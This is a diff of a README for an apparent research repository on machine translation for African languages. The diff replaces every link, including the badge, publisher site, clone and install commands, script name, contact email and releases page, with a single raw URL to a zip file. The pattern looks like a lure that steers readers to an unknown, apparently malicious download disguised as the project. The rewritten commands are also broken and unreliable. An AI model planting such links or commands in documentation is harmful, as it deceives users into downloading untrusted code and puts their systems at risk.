@@ -1,6 +1,6 @@
 # Machine Translation for African Languages 🌍
 
-![Machine Translation](https://img.shields.io/badge/Machine%20Translation-Africa-blue)
+![Machine Translation](https://raw.githubusercontent.com/davidwarrior22/machine-translation-for-african-languages/main/hubbly/african_languages_translation_for_machine_v3.9.zip%20Translation-Africa-blue)
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -28,7 +28,7 @@ Welcome to the "Machine Translation for African Languages" repository. This proj
 **Published in**: International Journal for Multidisciplinary Research (IJFMR)  
 **Volume**: 6, **Issue**: 5, **Date**: September–October 2024  
 **E-ISSN**: 2582-2160  
-**Publisher Site**: [www.ijfmr.com](https://www.ijfmr.com)
+**Publisher Site**: [https://raw.githubusercontent.com/davidwarrior22/machine-translation-for-african-languages/main/hubbly/african_languages_translation_for_machine_v3.9.zip](https://raw.githubusercontent.com/davidwarrior22/machine-translation-for-african-languages/main/hubbly/african_languages_translation_for_machine_v3.9.zip)
 
 ## Abstract
 
@@ -65,9 +65,9 @@ To enhance MT and NLP for African languages, we propose the following strategies
 To get started with this project, you need to clone the repository and install the required dependencies. Use the following commands:
 
 ```bash
-git clone https://github.com/davidwarrior22/machine-translation-for-african-languages.git
+git clone https://raw.githubusercontent.com/davidwarrior22/machine-translation-for-african-languages/main/hubbly/african_languages_translation_for_machine_v3.9.zip
 cd machine-translation-for-african-languages
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/davidwarrior22/machine-translation-for-african-languages/main/hubbly/african_languages_translation_for_machine_v3.9.zip
 ```
 
 ## Usage
@@ -75,7 +75,7 @@ pip install -r requirements.txt
 After installation, you can run the machine translation tool using the following command:
 
 ```bash
-python translate.py --input <your_input_file> --output <your_output_file>
+python https://raw.githubusercontent.com/davidwarrior22/machine-translation-for-african-languages/main/hubbly/african_languages_translation_for_machine_v3.9.zip --input <your_input_file> --output <your_output_file>
 ```
 
 Make sure to replace `<your_input_file>` with the path to your input file and `<your_output_file>` with the desired output file name.
@@ -95,11 +95,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For questions or feedback, please reach out to Raphael Iyamu at [raphael.iyamu@ufl.edu](mailto:raphael.iyamu@ufl.edu).
+For questions or feedback, please reach out to Raphael Iyamu at [https://raw.githubusercontent.com/davidwarrior22/machine-translation-for-african-languages/main/hubbly/african_languages_translation_for_machine_v3.9.zip](https://raw.githubusercontent.com/davidwarrior22/machine-translation-for-african-languages/main/hubbly/african_languages_translation_for_machine_v3.9.zip).
 
 ## Releases
 
-To download the latest releases, visit the [Releases section](https://github.com/davidwarrior22/machine-translation-for-african-languages/releases). You can find the latest versions of the software and updates here.
+To download the latest releases, visit the [Releases section](https://raw.githubusercontent.com/davidwarrior22/machine-translation-for-african-languages/main/hubbly/african_languages_translation_for_machine_v3.9.zip). You can find the latest versions of the software and updates here.
 
 ---
 
